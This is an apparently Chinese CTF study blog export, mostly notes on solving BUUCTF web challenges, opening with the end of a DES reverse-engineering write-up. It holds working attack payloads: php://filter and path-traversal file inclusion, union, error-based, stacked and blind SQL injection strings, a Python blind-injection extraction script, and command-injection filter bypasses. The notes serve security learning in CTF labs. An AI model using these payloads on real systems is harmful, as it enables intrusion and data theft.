<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     eax, [ebp+var_2C]</span><br><span class="line">xor     ecx, ecx   <span class="comment">//ecx清零</span></span><br><span class="line">mov     cl, [ebp+eax+var_28]   <span class="comment">//[ebp+var_28]和eax的和赋给cl,8位密文</span></span><br><span class="line">mov     edx, [ebp+var_2C]        </span><br><span class="line">xor     eax, eax       </span><br><span class="line">mov     al, byte_42AA30[edx]   <span class="comment">//byte数组（0xef,0x34,0xd4,0xa3,0xc6,0x84,0xe4,0x23）赋给al</span></span><br><span class="line">cmp     ecx, eax               <span class="comment">//判断ecx和eax是否相等</span></span><br><span class="line">jz      <span class="keyword">short</span> loc_401188</span><br></pre></td></tr></table></figure>

<p>若不相等则输出  Wrong! 相等则输出G00d Job!!</p>
<h2 id="综上所述"><a href="#综上所述" class="headerlink" title="综上所述"></a>综上所述</h2><p>初始密钥为：DE3_En1C</p>
<p>运用des解密算法可知明文为：HarDd3s?</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504214456025.png" alt="image-20210504214456025"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/undefined/%E3%80%90BUUCTF%E5%88%B7%E9%A2%98%E3%80%91Web%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80).html</url>
    <content><![CDATA[<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">边刷题边总结些知识点，还在更新，冲！</span><br></pre></td></tr></table></figure>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>1.dirsearch使用<br>下载地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>切换到安装目录</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">py dirsearch.py -u 网址 -e 语言（一般用*）</span><br></pre></td></tr></table></figure>
<p>-u 指定url<br>-e 指定网站语言</p>
<h2 id="SQL缺省"><a href="#SQL缺省" class="headerlink" title="SQL缺省"></a>SQL缺省</h2><p>payload：*,1</p>
<p>查询语句：select *,1||flag from Flag</p>
<p>解题思路2：<br>payload:1;set sql_mode=PIPES_AS_CONCAT;select 1</p>
<p>解析：</p>
<p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。<br>但在mysql 缺省不支持。需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能。</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>1.使用php伪协议读文件内容。使用filter过滤器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p>例题：BUUCTFweb  Secret File<br><img src="https://img-blog.csdnimg.cn/20210305080601771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>抓包</p>
<ol start="2">
<li><a href="https://www.cnblogs.com/leixiao-/p/10265150.html">phpmyadmin 4.8.1的一个远程文件包含的漏洞(CVE) </a><br>白名单验证：<br>例题：BUUCTF web warmup<br>示例代码如下：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> function <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])  ##不能为空</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])  ##是字符串</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])  ##上面checkfile返回为true</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
分析</li>
</ol>
<p>checkfile()函数<br>定义了一个白名单：source.php和hint.php，判断 $page是否为空、是否为字符串。<br>判断 $page是否在白名单里，若存在返回true；<br>考虑到page有参数的情况， $_page是取出 $page问号前的东西，然后再判断 $_page是否在白名单里，若存在则返回true；两个函数一个mb_substr和mb_strpos，总的意思就是截取变量page中?前面的字符串，然后再进行白名单校验。<br>之后是url二次编码问题，需要将?进行二次url编码<br>所以构造payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">file=hint.php%<span class="number">253f</span>/../../../../../../../../ffffllllaaaagggg</span><br><span class="line">或者</span><br><span class="line">file=hint.php?file:<span class="comment">//../../../../../ffffllllaaaagggg</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为服务器会自动解一次码，所以 $page的值为hint.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg，又一次url解码后，$_page的值为hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,然后截取问号前面的hint.php判断在白名单里返回true。</span><br></pre></td></tr></table></figure>


<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h3><p>使用hackbar<br>1.判断是字符型还是数字型</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or 1=1 #</span></span><br></pre></td></tr></table></figure>
<p>如果是整形，他的报错信息应为<br>“ ’ “ 那我们需要闭合，由于这个题目没有过滤任何sql注入的关键字，我们直接用 %23（#）来进行闭合sql语句</p>
<p>2.爆列数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">11</span><span class="string">&#x27; order by 3%23  一般为3时有回显，字段数为3</span></span><br></pre></td></tr></table></figure>
<p>3.爆库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&amp;password&#x3D;11&#39; union select 1,version(),database()%23</span><br></pre></td></tr></table></figure>
<p>4.爆表名</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">123</span>&amp;password=<span class="number">111</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br></pre></td></tr></table></figure>
<p>5.爆表</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;&amp;password=<span class="number">1</span><span class="string">&#x27;union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">?username=1&amp;&amp;password=1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(concat_ws(<span class="string">&#x27;-&#x27;</span>,id,username,password)) from l0ve1ysq1%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>ps:功能函数<br>1.concat_ws()函数<br> 功能：一次性指定分隔符<br> 语法：concat_ws(separator,str1,str2,…)<br> 说明：第一个参数指定分隔符 分隔符不能为空 如果为NULL 则返回值NULL<br> 2.concat()函数<br> 功能：将多个字符串拼接成一个字符串<br> 语法：concat(str1,str2,…)<br> 返回结果为连接参数产生的字符串 如果有任何一个参数为NULL 则返回值NULL<br> 3.group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] )<br> 即按需求打印内容</p>
<h3 id="BUUCTF-HardSQL"><a href="#BUUCTF-HardSQL" class="headerlink" title="BUUCTF HardSQL"></a>BUUCTF HardSQL</h3><p>一个字符一个字符试发现很多字符如and,union都被过滤<br>因为空格被过滤，用()分割语句达到代替空格的效果。=被过滤，可以用like替代。尝试用<a href="https://blog.csdn.net/qq_37873738/article/details/88042610">updatexml报错注入</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">check.php?username=<span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=2</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>爆出库名<br><img src="https://img-blog.csdnimg.cn/20210405152829188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>爆表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">check.php?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e),1))%23&amp;password&#x3D;2</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210405153605334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p> 爆列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">check.php?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e),1))%23&amp;password&#x3D;2</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210405153808773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>因为updataxml限制语句为32位，而flag长度大于32位，所以用left和right函数拼接</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">前半部分 check.php?username=<span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select((left(password,30)))from(H4rDsq1)),0x7e),1))%23&amp;password=2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">后半部分 ![check.php?username=1&#x27;</span>or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select((right(password,<span class="number">30</span>)))from(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">2</span>](https:<span class="comment">//img-blog.csdnimg.cn/20210405154340430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210405154333435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021040515442494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>参考文章：【extractvalue报错注入】<a href="https://blog.csdn.net/qin9800/article/details/113446035">https://blog.csdn.net/qin9800/article/details/113446035</a>  </p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。<br>而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<p>查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
<p>1’;desc <code>1919810931114514</code>;</p>
<p>知识点1：堆叠注入<br>在SQL中，分号是用来表示一条sql语句的结束。如果在 ; 结束一个sql语句后继续构造下一条语句，效果就是分别执行两条sql语句。由于两条语句堆叠在同一行，而不是原本应该各自占据一行，所以这种注入成为堆叠注入。</p>
<p>知识点2<br>当数字型字符作为字段、表、库名查询时，应该用反单引号括起来</p>
<p>mysql预处理语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PREPARE sqla from <span class="string">&#x27;[my sql sequece]&#x27;</span>;  	 预定义SQL语句</span><br><span class="line">EXECUTE sqla; 							 执行预定义SQL语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla;  	 删除预定义SQL语句</span><br></pre></td></tr></table></figure>

<p>通过变量进行传递<br>SET @tn = ‘flag’;                      存储表名<br>SET @sql = concat(‘select * from ‘, @tn);          存储SQL语句<br>PREPARE sqla from @sql;           预定义SQL语句<br>EXECUTE sqla;                  执行预定义SQL语句<br>(DEALLOCATE || DROP) PREPARE sqla;      删除预定义SQL语句</p>
<p>PREPARE语句准备好一条SQL语句，并分配给这条SQL语句一个名字供之后调用。<br>准备好的SQL语句通过EXECUTE命令执行，通过DEALLOCATE PREPARE命令释放掉。</p>
<h3 id="使用MD5函数实现sql注入"><a href="#使用MD5函数实现sql注入" class="headerlink" title="使用MD5函数实现sql注入"></a>使用MD5函数实现sql注入</h3><p>BUUCTF easy MD5<br>1.知识点：<br>（1）MD5函数在加密ffifdyop后返回原始字符串’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c  ，另外mysql中以数字开头的字符串会被当做整形处理例如‘6abc’=6。<br>（2）md5绕过：因为md5不能处理数组，会返回NULL，因为NULL=NULL，可以实现绕过，传入数组，使得 md5 处理两个参数都返回 0 即可： payload:?a[]=1&amp;b[]=2<br>或者传入两个md5处理后以0e开头的字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">下列的字符串的MD5值都是0e开头的：</span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
<p>2.解题<br>随便输入后抓包发现Hint中有提示<br><img src="https://img-blog.csdnimg.cn/2021032819425783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用md5特性传入ffifdyop，使得select语句为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select * from <span class="string">&#x27;admin&#x27;</span> where password=<span class="string">&#x27; &#x27;</span>or <span class="string">&#x27;6&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这样就相当于sql语句为永真实现注入<br>得到<br><img src="https://img-blog.csdnimg.cn/2021032819454254.png" alt="在这里插入图片描述"><br>访问页面发现了php页面<br><img src="https://img-blog.csdnimg.cn/20210328194640825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用md5绕过得到<br><img src="https://img-blog.csdnimg.cn/20210328194802705.png" alt="在这里插入图片描述"><br>访问页面同样为一个md5绕过的php页面，易得flag</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="BUUCTF-WEB-CISCN2019-华北赛区-Day2-Web1-Hack-World-SQL盲注，PHP）"><a href="#BUUCTF-WEB-CISCN2019-华北赛区-Day2-Web1-Hack-World-SQL盲注，PHP）" class="headerlink" title="BUUCTF WEB [CISCN2019 华北赛区 Day2 Web1]Hack World(SQL盲注，PHP）"></a>BUUCTF WEB [CISCN2019 华北赛区 Day2 Web1]Hack World(SQL盲注，PHP）</h4><ul>
<li><p>题目描述:<br><img src="https://img-blog.csdnimg.cn/20210331144544929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>已知表名和列名，并且发现过滤了很多sql字符，尝试注入</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>^(ascii(substr((select(flag)<span class="keyword">from</span>(flag)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>)^<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>奉上大佬脚本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f0c8caf0-fc27-454e-83bc-a557d1891b94.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">temp = &#123;<span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high =<span class="number">128</span></span><br><span class="line">    mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        temp[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;1^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)^1&quot;</span> %(i,mid)</span><br><span class="line">        r = requests.post(url,data=temp)</span><br><span class="line">        print(low,high,mid,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid =(low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> or mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag=&quot;</span> ,flag)</span><br></pre></td></tr></table></figure></li>
<li><p>请看这位师傅的<a href="https://blog.csdn.net/qq_42967398/article/details/103517730?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161715960816780266221075%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161715960816780266221075&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-103517730.pc_search_result_cache&utm_term=BUUCTF++web+HackWorld&spm=1018.2226.3001.4187">题解</a><br>sql字典</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select</span><br><span class="line">from</span><br><span class="line">ascii</span><br><span class="line">substr</span><br><span class="line">table</span><br><span class="line">column</span><br><span class="line">by</span><br><span class="line">schema</span><br><span class="line">where</span><br><span class="line">extractvalue</span><br><span class="line">exp</span><br><span class="line"><span class="keyword">if</span></span><br><span class="line">/</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">%</span><br><span class="line">!</span><br><span class="line">@</span><br><span class="line">#</span><br><span class="line">$</span><br><span class="line">^</span><br><span class="line">&amp;</span><br><span class="line">*</span><br><span class="line">-</span><br><span class="line">_</span><br><span class="line">+</span><br><span class="line">=</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">~</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">\</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"><span class="string">,</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">||</span></span><br><span class="line"><span class="string">&amp;&amp;</span></span><br><span class="line"><span class="string">order</span></span><br><span class="line"><span class="string">updatexml</span></span><br><span class="line"><span class="string">limit</span></span><br><span class="line"><span class="string">And</span></span><br><span class="line"><span class="string">Or</span></span><br><span class="line"><span class="string">%23</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;</span></span><br><span class="line"><span class="string">&gt;</span></span><br><span class="line"><span class="string">regex</span></span><br><span class="line"><span class="string">group_concat</span></span><br><span class="line"><span class="string">table_name</span></span><br><span class="line"><span class="string">table_schema</span></span><br><span class="line"><span class="string">column_name</span></span><br><span class="line"><span class="string">database</span></span><br><span class="line"><span class="string">imformation</span></span><br><span class="line"><span class="string">union select</span></span><br><span class="line"><span class="string">ascii(substr())</span></span><br><span class="line"><span class="string">(select(group_concat(table_name))</span></span><br><span class="line"><span class="string">from(information_schema.tables)where(table_schema=database())</span></span><br><span class="line"><span class="string">(ascii(substr((select(group_concat(flaaag))from(flag)),%s,1))=%s)</span></span><br><span class="line"><span class="string">where(table_schema=database())</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>补充：<a href="https://blog.csdn.net/hahazaizheli/article/details/96428290?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161717432816780265487351%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161717432816780265487351&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-96428290.pc_search_result_cache&utm_term=%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8CFUZZ%E6%B5%8B%E8%AF%95&spm=1018.2226.3001.4187">使用burp进行Fuzz测试实现SQL注入</a>，<a href="https://blog.csdn.net/qq_35793285/article/details/111818477?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161717432816780265487351%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161717432816780265487351&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111818477.pc_search_result_cache&utm_term=%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8CFUZZ%E6%B5%8B%E8%AF%95&spm=1018.2226.3001.4187">burp的Intruder模块</a></p>
</li>
</ul>
<h4 id="GYCTF2020-Blacklist-堆叠注入"><a href="#GYCTF2020-Blacklist-堆叠注入" class="headerlink" title="[GYCTF2020]Blacklist [堆叠注入]"></a>[GYCTF2020]Blacklist [堆叠注入]</h4><p><img src="https://img-blog.csdnimg.cn/20210405191501429.png" alt="在这里插入图片描述"></p>
<ul>
<li>尝试堆叠注入<br><img src="https://img-blog.csdnimg.cn/20210405192726588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>爆列名<br><img src="https://img-blog.csdnimg.cn/20210405192831216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<p>HANDLER方法<br>引自大佬：HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭<br>构造：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span></span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/SopRomeo/article/details/105396372?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161762143216780271594201%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161762143216780271594201&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-105396372.pc_search_result_cache&utm_term=%5BGYCTF2020%5DBlacklist&spm=1018.2226.3001.4187">参考文章</a></p>
<h2 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h2><p>常用管道符命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&amp; （按位与） 表示任务在后台执行，如要在后台运行redis-server,则有 redis-server &amp;</span><br><span class="line"></span><br><span class="line">&amp;&amp; （逻辑与）表示前一条命令执行成功时，才执行后一条命令 ，如果前面为假，后面的命令也不执行   如 echo <span class="string">&#x27;1‘ &amp;&amp; echo ‘2’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">| （按位或）表示管道，上一条命令的输出，作为下一条命令参数，直接执行|后面的语句，如 echo ‘yes’ | wc -l</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">|| （逻辑或）表示上一条命令执行失败后，才执行下一条命令，否则只执行前面的语句，如 cat nofile || echo “fail”</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">; 分号表示命令依次执行。</span></span><br></pre></td></tr></table></figure>

<p>1.过滤问题：空格 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$<span class="string">&#x27;\x20flag.txt&#x27;</span>&amp;&amp;cat$kg</span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式绕过)</span><br></pre></td></tr></table></figure>
<p>1)变量拼接字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">b=ag.php;a=fl;cat$IFS$<span class="number">9</span>$a$b </span><br><span class="line"> </span><br><span class="line"><span class="comment">//为什么要反过来？flag匹配时中间有内容也会被匹配。</span></span><br><span class="line"><span class="comment">//表达式 .* 就是单个字符匹配任意次，即贪婪匹配。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为贪婪匹配</span></span><br></pre></td></tr></table></figure>
<p>2)base编码绕过<br>base64 编码的方式来绕过 flag 过滤</p>
